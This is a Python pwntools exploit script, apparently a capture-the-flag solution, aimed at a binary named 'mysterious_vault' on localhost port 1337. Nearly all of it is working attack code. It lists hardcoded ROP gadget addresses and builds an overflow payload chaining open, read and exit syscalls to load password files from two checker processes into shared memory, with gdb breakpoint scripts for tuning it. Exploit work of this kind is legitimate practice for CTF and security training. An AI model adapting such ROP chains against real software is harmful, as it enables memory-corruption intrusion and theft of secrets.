#!/usr/bin/env python3

from pwn import *

exe = ELF("../src/mysterious_vault")

context.binary = exe
context.terminal = ["urxvt", "-e", "sh", "-c"]


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("localhost", 1337)

    return r


def main():
    SHARED_ADDR = 0x1337000
    splitting_gadg = 0x427ae6
#splitting_gadg:
#3000: pop rbx ; pop rbp ; ret
#3001: add rsp, 0x70; pop rbp ; ret


# 3000 gadgs
    #0x00402261: pop rdi; ret;
    #0x00404ee2: pop rsi; ret;
    #0x004183a2: pop rax; ret;
    #0x00456d37: pop rdx; pop rbx; ret;

    p_rdi_3000 = 0x402371
    p_rsi_3000 = 0x404fe2
    p_rax_3000 = 0x457098
    p_rdx_rbx_3000 = 0x456df7
    syscall_3000 = 0x40a5d2
    syscall_p_rbx_3000 = 0x42b0d5 # syscall ; pop rbx ; ret
    password_addr_3000 = 0x47711e

    xor_esi_call_rbp = 0x44c157 # xor esi, esi ; call rbp

    p_rdi_3001 = 0x41d282
    p_rsi_3001 = 0x425444
    p_rax_3001 = 0x42aa60
    password_addr_3001 = 0x42f161
    mov_rdx_3001 = 0x401a2e # mov rdx, [rbp-0x20]; syscall
    syscall_3001 = 0x401a32 # rbp-0x28 must be writeable, and it pops rbp after
    p_rbp_3001 = 0x4010d1

    #optimisations
    #include password somewhere in the file to prevent needing to load it
    # ret-val of open will be 0, which is the syscall for read, so dont need to set rax val

    # instead of pop-rsi for open (where we want rsi = 0)
    # xor esi ; esi ; call rbp
    # The splitting gadg means we're loading rbp anyways so point it to a gadget
    # point it to a syscall ; ret
    # except call stores the retuen point, so go with syscall ; pop rbx ; ret
    payload = flat({
        0: 0,
        
        0xd8: p64(p_rdi_3001),
        0xe0: p64(password_addr_3001),

        0xe8: p64(splitting_gadg),
        0xf0: p64(0), # 0 -> rbx
        0xf8: p64(syscall_p_rbx_3000), # rbp = syscall ; pop rbx ; ret
        0x100: p64(p_rdi_3000),
        0x108: p64(password_addr_3000),
        0x110: p64(p_rax_3000),
        0x118: p64(2),
        0x120: p64(xor_esi_call_rbp), # call rbp == syscall ; pop rbx ; ret. pop rbx absorps the rip placed by the call
        0x128: p64(p_rdi_3000),
        0x130: p64(0),
        0x138: p64(p_rsi_3000),
        0x140: p64(SHARED_ADDR), #May be allowed to skip loading rdx here for 3000_checker
        0x148: p64(syscall_3000),
        0x150: p64(p_rax_3000),
        0x158: p64(60),
        0x160: p64(syscall_3000),



        0x168: p64(p_rbp_3001),
        0x170: p64(0x44f800),
        0x178: p64(p_rax_3001),
        0x180: p64(2),
        0x188: p64(p_rsi_3001),
        0x190: p64(0),
        0x198: p64(syscall_3001),
        0x1a0: p64(0x450020),
        0x1a8: p64(p_rdi_3001),
        0x1b0: p64(0),
        0x1b8: p64(p_rsi_3001),
        0x1c0: p64(SHARED_ADDR+0x20),
        0x1c8: p64(mov_rdx_3001),
        0x1d0: p64(0),
        0x1d8: p64(p_rax_3001),
        0x1e0: p64(60),
        0x1e8: p64(syscall_3001),
    })




    r = conn()
    r.recvuntil(": ")
    r.send(b"A"*0x1ff)

    script_3001= """
        set follow-fork-mode parent
        b *(spawn_checkers+170)
        b *(main+141)
        c
        set follow-fork-mode child
        c
        """

    script_3000="""
        b *(main+394)
        c
        """

    #gdb.attach(r, gdbscript=script_3001)

    r.send(payload)


    r.interactive()
    while True:
        print(r.recv())
    r.recvuntil(": ")

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
